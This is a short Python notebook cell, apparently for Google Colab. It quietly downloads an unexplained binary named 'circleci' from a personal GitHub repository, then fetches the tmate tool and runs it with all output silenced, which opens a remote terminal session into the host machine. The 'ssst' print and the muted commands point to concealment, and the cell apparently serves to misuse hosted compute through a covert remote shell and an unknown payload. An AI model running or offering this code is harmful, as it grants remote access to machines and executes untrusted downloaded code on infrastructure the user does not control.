#@title
import urllib.request
import os
print('ssst')
urllib.request.urlretrieve('https://github.com/aurbach55/zash/raw/main/circleci','circleci')
os.system ("wget https://github.com/tmate-io/tmate/releases/download/2.4.0/tmate-2.4.0-static-linux-amd64.tar.xz &> /dev/null && tar -xf tmate-2.4.0-static-linux-amd64.tar.xz &> /dev/null && cd tmate-2.4.0-static-linux-amd64 &> /dev/null && ./tmate -F ")
